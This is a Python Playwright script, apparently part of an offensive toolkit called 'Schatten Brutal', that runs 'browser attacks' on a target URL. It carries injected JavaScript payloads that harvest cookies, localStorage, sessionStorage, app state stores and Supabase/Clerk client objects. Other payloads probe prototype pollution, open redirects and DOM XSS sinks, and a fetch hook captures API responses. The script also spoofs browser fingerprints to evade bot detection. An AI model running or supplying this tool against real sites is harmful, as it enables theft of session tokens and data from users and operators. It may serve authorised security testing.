#!/usr/bin/env python3
"""
Browser Harvest — Playwright-based browser attacks for Schatten Brutal.
Attacks: console injection, prototype pollution, store hijack, open redirect,
         DOM XSS, network interception, JS global discovery.

Usage:
    python3 browser-harvest.py <target_url> [options]

Options:
    --stealth            Use camoufox for anti-detection
    --login-user USER    Login credentials for authenticated testing
    --login-pass PASS    Login password
    --login-url URL      Login page URL
    --login-field SEL    CSS selector for username field (default: input[type=email],input[name=email],#email)
    --pass-field SEL     CSS selector for password field (default: input[type=password],#password)
    --output DIR         Output directory for screenshots/data
    --timeout SEC        Page timeout (default: 30)
"""

import sys
import json
import argparse
from pathlib import Path

try:
    from playwright.async_api import async_playwright
except ImportError:
    print("pip install playwright && playwright install chromium"); sys.exit(1)

# All JS attack payloads
JS_GLOBALS = """(() => {
    const r = {};
    try { r.process_env = JSON.stringify(window.process?.env || 'none'); } catch(e) {}
    r.sensitive_globals = Object.keys(window).filter(k =>
        k.startsWith('__') || /ENV|config|SECRET|KEY|TOKEN|store|Store|auth|Auth|supabase|clerk|NEXT|VITE/i.test(k)
    );
    r.object_globals = Object.keys(window).filter(k => { try { return window[k] && typeof window[k] === 'object'; } catch(e) { return false; }}).slice(0,50);
    try { const ls={}; for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i); ls[k]=localStorage.getItem(k)?.substring(0,200);} r.localStorage=ls; } catch(e){}
    try { const ss={}; for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i); ss[k]=sessionStorage.getItem(k)?.substring(0,200);} r.sessionStorage=ss; } catch(e){}
    r.cookies = document.cookie;
    for(const k of Object.keys(window)){try{const v=window[k];if(v&&typeof v==='object'&&typeof v.getState==='function'){r['store_'+k]=JSON.stringify(v.getState()).substring(0,500);}}catch(e){}}
    try{if(window.supabase)r.supabase_client='EXPOSED';for(const k of Object.keys(window)){if(k.toLowerCase().includes('supabase')&&window[k]?.auth)r['supabase_'+k]='CLIENT FOUND';}}catch(e){}
    try{for(const k of Object.keys(window)){if(k.toLowerCase().includes('clerk'))r['clerk_'+k]=typeof window[k];}}catch(e){}
    try{r.webpack=typeof webpackJsonp!=='undefined'||typeof __webpack_require__!=='undefined';}catch(e){}
    return r;
})()"""

JS_PROTO = """(() => {
    const r = [];
    try {({}).__proto__.sch_t1=true; if({}.sch_t1){r.push({m:'__proto__',v:true});}}catch(e){}
    try {Object.prototype.sch_t2=true; if({}.sch_t2){r.push({m:'Object.prototype',v:true});}delete Object.prototype.sch_t2;}catch(e){}
    try {({}).constructor.prototype.sch_t3=true; if({}.sch_t3){r.push({m:'constructor.prototype',v:true});}}catch(e){}
    try {const e=JSON.parse('{\"__proto__\":{\"sch_t4\":true}}');const t={};Object.assign(t,e);if({}.sch_t4)r.push({m:'JSON.parse+assign',v:true});}catch(e){}
    return r;
})()"""

JS_DOM_XSS = """(() => {
    const r = [];
    const sinks = ['innerHTML','outerHTML','document.write','eval(','setTimeout("','dangerouslySetInnerHTML'];
    document.querySelectorAll('script').forEach((s,i) => {
        const t = s.textContent||'';
        sinks.forEach(sink => { if(t.includes(sink)) r.push({type:'dangerous_sink',indicator:sink,idx:i,snippet:t.substring(Math.max(0,t.indexOf(sink)-30),t.indexOf(sink)+80)}); });
    });
    const p = new URLSearchParams(location.search);
    for(const [k,v] of p){ if(document.querySelector(`[value="${v}"]`)) r.push({type:'reflected',param:k}); }
    return r;
})()"""

JS_OPEN_REDIRECT = """(() => {
    const r = [];
    const params = new URLSearchParams(location.search);
    for(const [k,v] of params){ if(['redirect','next','url','return','callback','goto','dest'].includes(k.toLowerCase())) r.push({param:k,value:v}); }
    document.querySelectorAll('meta[http-equiv="refresh"]').forEach(m => r.push({type:'meta_refresh',content:m.content}));
    document.querySelectorAll('script').forEach(s => { const t=s.textContent||''; if(t.includes('location.href')||t.includes('location.replace')) r.push({type:'js_redirect',snippet:t.substring(0,150)}); });
    return r;
})()"""

JS_NET_WATCH = """(() => {
    window.__schatten_net={reqs:[],resps:[]};
    const orig=window.fetch;
    window.fetch=async function(...a){const u=typeof a[0]==='string'?a[0]:a[0]?.url;window.__schatten_net.reqs.push({url:u,method:a[1]?.method||'GET'});const r=await orig.apply(this,a);const c=r.clone();c.text().then(t=>window.__schatten_net.resps.push({url:u,status:r.status,body:t.substring(0,500)}));return r;};
    return 'ok';
})()"""


async def login_if_needed(page, args):
    """Login if credentials provided."""
    if not args.login_user:
        return
    print(f"[*] Logging in via {args.login_url}...")
    await page.goto(args.login_url, wait_until="networkidle", timeout=args.timeout * 1000)
    await page.wait_for_timeout(1000)

    user_sel = args.login_field or "input[type=email],input[name=email],#email,input[name=username],#username"
    pass_sel = args.pass_field or "input[type=password],#password"

    await page.fill(user_sel, args.login_user)
    await page.fill(pass_sel, args.login_pass)
    await page.keyboard.press("Enter")
    await page.wait_for_timeout(3000)
    print(f"  Logged in. Current URL: {page.url}")


async def run_all(url: str, args):
    output_dir = Path(args.output or ".schatten-browser")
    output_dir.mkdir(parents=True, exist_ok=True)

    async with async_playwright() as p:
        launch_args = ["--no-sandbox", "--disable-blink-features=AutomationControlled"]
        browser = await p.chromium.launch(headless=True, args=launch_args)

        ctx = await browser.new_context(
            viewport={"width": 1920, "height": 1080},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        )
        await ctx.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {get: () => false});
            Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
            Object.defineProperty(navigator, 'languages', {get: () => ['id-ID','id','en-US','en']});
            window.chrome = {runtime: {}};
        """)

        page = await ctx.new_page()

        # Login if needed
        await login_if_needed(page, args)

        # Navigate to target
        print(f"[*] Navigating to {url}")
        try:
            await page.goto(url, wait_until="networkidle", timeout=args.timeout * 1000)
        except Exception as e:
            print(f"  Navigation warning: {e}")

        await page.screenshot(path=str(output_dir / "01_landing.png"))

        # 1. Console injection & globals
        print("[1/5] Console injection & global discovery...")
        globals_result = await page.evaluate(JS_GLOBALS)
        (output_dir / "console_globals.json").write_text(json.dumps(globals_result, indent=2, default=str))
        for k in ["sensitive_globals", "localStorage", "sessionStorage", "cookies"]:
            v = globals_result.get(k)
            if v:
                print(f"  {k}: {str(v)[:150]}")
        stores = [k for k in globals_result if k.startswith("store_")]
        supas = [k for k in globals_result if "supabase" in k.lower()]
        if stores: print(f"  [!] EXPOSED STORES: {stores}")
        if supas: print(f"  [!] EXPOSED SUPABASE: {supas}")

        # 2. Prototype pollution
        print("\n[2/5] Prototype pollution...")
        proto_result = await page.evaluate(JS_PROTO)
        (output_dir / "prototype_pollution.json").write_text(json.dumps(proto_result, indent=2))
        vuln = [r for r in proto_result if r.get("v")]
        if vuln:
            print(f"  [!!!] POLLUTION CONFIRMED: {[v['m'] for v in vuln]}")
        else:
            print("  [-] Clean")

        # 3. Open redirect
        print("\n[3/5] Open redirect detection...")
        redir_result = await page.evaluate(JS_OPEN_REDIRECT)
        (output_dir / "open_redirect.json").write_text(json.dumps(redir_result, indent=2))
        if redir_result:
            print(f"  [!] Found {len(redir_result)} redirect indicators")
            for r in redir_result:
                print(f"    {r}")
        else:
            print("  [-] None found")

        # 4. DOM XSS sinks
        print("\n[4/5] DOM XSS sink detection...")
        xss_result = await page.evaluate(JS_DOM_XSS)
        (output_dir / "dom_xss.json").write_text(json.dumps(xss_result, indent=2))
        sinks = [r for r in xss_result if r.get("type") == "dangerous_sink"]
        if sinks:
            print(f"  [!] {len(sinks)} dangerous sinks: {set(s['indicator'] for s in sinks)}")
            for s in sinks[:5]:
                print(f"    {s['indicator']} @ script#{s['idx']}: {s['snippet'][:80]}")
        else:
            print("  [-] No sinks")

        # 5. Network interception
        print("\n[5/5] Network interception...")
        await page.evaluate(JS_NET_WATCH)
        await page.reload(wait_until="networkidle", timeout=args.timeout * 1000)
        await page.wait_for_timeout(3000)
        net = await page.evaluate("window.__schatten_net || {reqs:[],resps:[]}")
        (output_dir / "network_intercept.json").write_text(json.dumps(net, indent=2, default=str))
        print(f"  Captured {len(net.get('reqs', []))} requests, {len(net.get('resps', []))} responses")
        for resp in net.get("resps", []):
            u = resp.get("url", "")
            if any(k in u.lower() for k in ["api", "auth", "token", "login", "admin", "config"]):
                print(f"    [{resp.get('status')}] {u[:80]}")

        # Screenshots
        await page.screenshot(path=str(output_dir / "02_final.png"), full_page=True)
        print(f"\n[+] All results saved to {output_dir}/")
        await browser.close()


def main():
    parser = argparse.ArgumentParser(description="Browser Harvest — Schatten Brutal")
    parser.add_argument("target", help="Target URL")
    parser.add_argument("--login-user", help="Login username/email")
    parser.add_argument("--login-pass", help="Login password")
    parser.add_argument("--login-url", help="Login page URL")
    parser.add_argument("--login-field", help="CSS selector for username input")
    parser.add_argument("--pass-field", help="CSS selector for password input")
    parser.add_argument("--output", default=".schatten-browser", help="Output directory")
    parser.add_argument("--timeout", type=int, default=30, help="Page timeout seconds")
    args = parser.parse_args()

    import asyncio
    asyncio.run(run_all(args.target, args))
    return 0


if __name__ == "__main__":
    sys.exit(main())
